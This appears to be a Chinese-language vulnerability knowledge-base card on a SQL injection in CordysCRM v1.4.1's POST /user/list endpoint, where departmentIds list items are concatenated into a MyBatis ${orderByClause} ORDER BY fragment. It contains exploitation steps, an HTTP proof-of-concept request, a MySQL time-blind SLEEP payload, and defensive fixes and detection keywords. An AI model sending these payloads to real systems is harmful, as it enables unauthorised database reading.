---
id: web-generic-sqli-cordyscrm-departmentids-field-orderby
title: CordysCRM departmentIds 经 StringJoiner 拼入 FIELD() 再进 MyBatis ${orderByClause}：列表接口 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: mybatis-orderby-field-list-concat-injection
tags:
- sqli
- java
- mybatis
- orderby
- list-parameter
- string-concat
- cordyscrm
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: v1.4.1（原文测试版本，作者称最新版已修复）
verification:
  verified_by: verifier-V58
  verified_at: '2026-11-05T08:59:32+08:00'
  notes: 已对照原文与图12-21核对：ExtOrganizationUserMapper.xml <sql id=sorts> 使用 ${orderByClause}，Service list() 调 buildOrderByFieldClause(request.getDepartmentIds())，StringJoiner 以 FIELD(department_id, ...) 拼接每个 "'"+deptId+"'"，UserPageRequest.departmentIds 为 List<@NotBlank String> 且 controller 仅要求 SYS_ORGANIZATION_READ，与图12-21一致。未验证点：原文 PoC 使用“注入点”占位符，未展示成功回显/时间差，卡片 confidence=medium 且已注明；CSRF token 含 Shiro sessionId 无法离线伪造；PoC 未本机执行；frontmatter 无 sources/source_url。
url: /docs/web/generic/sqli/web-generic-sqli-cordyscrm-departmentids-field-orderby/
draft: false
kb_aliases:
- CordysCRM SQL注入
- departmentIds SQL注入
- FIELD 排序注入
- orderByClause 注入
- 组织用户列表注入
---

## 一句话结论

CordysCRM v1.4.1 的 `POST /user/list` 中，`UserPageRequest.departmentIds`（`List<String>`）被 `buildOrderByFieldClause` 逐项用单引号包裹后拼成 `FIELD(department_id, '...')`，再作为 `orderByClause` 传给 MyBatis `<sql id="sorts">` 中的 `${orderByClause}`；由于列表元素完全来自请求且未做白名单/转义，攻击者可在 `departmentIds` 元素中闭合单引号并注入任意 SQL 表达式。

## 原理

- 入口：`OrganizationUserController.list(@Validated @RequestBody UserPageRequest request)`，路由 `POST /user/list`，需要 `SYS_ORGANIZATION_READ` 权限。
- `UserPageRequest` 继承 `BasePageRequest`，自身字段只有 `private List<@NotBlank String> departmentIds;`；`@NotBlank` 只保证元素非空，不限制字符内容。
- Service 的 `list(UserPageRequest request)` 调用 `buildOrderByFieldClause(request.getDepartmentIds())`：
  - 若 `departmentIds` 为 null 或空，返回 `"1"`；
  - 否则 `StringJoiner sj = new StringJoiner(",", "FIELD(department_id, ", ")")`，对每个 `deptId` 执行 `sj.add("'" + deptId + "'")`，直接字符串拼接，无转义；
  - 返回值作为 `orderByClause` 传给 `extOrganizationUserMapper.list(request, orderByClause)`。
- Mapper XML 的 `<sql id="sorts">` 在 `order by` 子句中直接写 `${orderByClause}`（同时还有 `${sortName}`、`${sortType}` 等文本替换点），没有使用 `#{}` 预编译。
- 生成 SQL 形如 `... order by sou.enable DESC, FIELD(department_id, '101723549932191744','1')注入点('1'), is_commander DESC ...`：`FIELD` 参数列表被元素中的 `'` 闭合，剩余部分进入 SQL 语法层，形成注入。
- 之所以不是普通 `#{}` 参数问题：`orderByClause` 是排序子句的 SQL 文本，服务端为了动态排序用 `${}` 拼接；而 `departmentIds` 本应是值列表，却被错误地拼进标识符/表达式上下文。

## 触发条件

- 目标为 CordysCRM v1.4.1（原文测试版本，作者称最新版已修复）。
- 攻击者拥有可访问 `POST /user/list` 的账号，且具备 `SYS_ORGANIZATION_READ` 权限（登录后的低权业务账号即可，具体以目标 RBAC 配置为准）。
- 请求需携带有效的 `X-AUTH-TOKEN` 与 `CSRF-TOKEN`（登录后由服务端下发；CSRF token 使用硬编码 AES 密钥生成，但其中含不可预测的 Shiro sessionId，原文认为无法离线伪造）。
- `departmentIds` 至少包含一个可控字符串元素。

## 利用步骤

1. 登录 CordysCRM，抓取任意请求获取 `X-AUTH-TOKEN` 与 `CSRF-TOKEN`。
2. 向 `POST /user/list` 发送 JSON，`departmentIds` 中放入一个正常部门 id 和一个恶意元素；先用单引号验证是否报错或响应变化。
3. 使用时间盲注确认，例如让注入片段生成 `SLEEP(3)` 或 `BENCHMARK(...)`；也可用布尔条件对比返回条数。
4. 确认后按数据库类型构造 UNION/报错/时间盲注读取数据；注意注入点位于 `ORDER BY` 子句后的表达式位置，需保持整体 SQL 语法合法。
5. 记录请求与响应时间/报错证据，验证后停止，不对生产数据做写操作。

## PoC

原文请求（`注入点` 为占位符，需替换为合法 SQL 表达式）：

```http
POST /user/list HTTP/1.1
Host: target:8081
CSRF-TOKEN: <登录后下发>
Content-Type: application/json;charset=UTF-8
X-AUTH-TOKEN: <登录后下发>

{
  "current": 1,
  "pageSize": 30,
  "combineSearch": { "searchMode": "AND", "conditions": [] },
  "keyword": "",
  "departmentIds": [
    "101723549932191744",
    "1')注入点('1"
  ],
  "filters": []
}
```

拼接结果（示意）：

```sql
order by sou.enable DESC,
  FIELD(department_id, '101723549932191744','1')注入点('1'),
  is_commander DESC, ...
```

时间盲注思路（MySQL，需按实际 SQL 调整闭合与注释）：

```json
"departmentIds": ["101723549932191744", "1'),(SELECT SLEEP(3))-- -"]
```

若响应时间稳定增加，说明注入生效；原文只给出占位请求，未展示成功回显/时间差截图。

## 变体与关联

- 变体：`sort.name`、`sort.type`、`sortName`、`sortType` 也是 `${}` 文本替换点；但 `SortRequest.name` 有 `@Pattern("^[A-Za-z0-9-]+$")`，利用面小于 `departmentIds`。
- 变体：其他 MyBatis `<sql>` 片段若复用 `sorts`，同样受 `orderByClause` 影响，可横向找引用 `<include refid="sorts">` 的查询。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]（MyBatis `${}` 五类拼接点的通用原理；本卡是“列表参数被服务端拼成 orderByClause”的具体变体）。
- 关联：[[web-generic-sqli-craft-commerce-sort-orderby-time-blind]]、[[web-generic-sqli-oa-jsp-orderby-sort-updatexml]]（同为排序参数进入 ORDER BY 的注入）。

## 检测与防御

- 防御：`departmentIds` 的值必须通过 `#{}` 绑定；若需要按给定 id 排序，可用 `ORDER BY FIELD(department_id, #{id1}, #{id2}, ...)` 动态生成占位符，或改为在应用层排序。
- 防御：`orderByClause` 这类动态 SQL 片段只能由服务端枚举/白名单生成，禁止把任何请求字段拼接进去；`${}` 仅用于固定映射后的标识符。
- 检测：审计搜索 `${orderByClause}`、`FIELD(` + 字符串拼接；对 `departmentIds` 元素出现引号、括号、逗号、注释符、`SLEEP`/`BENCHMARK` 等特征告警。
- 检测：`/user/list` 响应时间异常、数据库报错、返回条数与筛选条件不符；MyBatis SQL 日志中出现非常规 `ORDER BY` 片段。
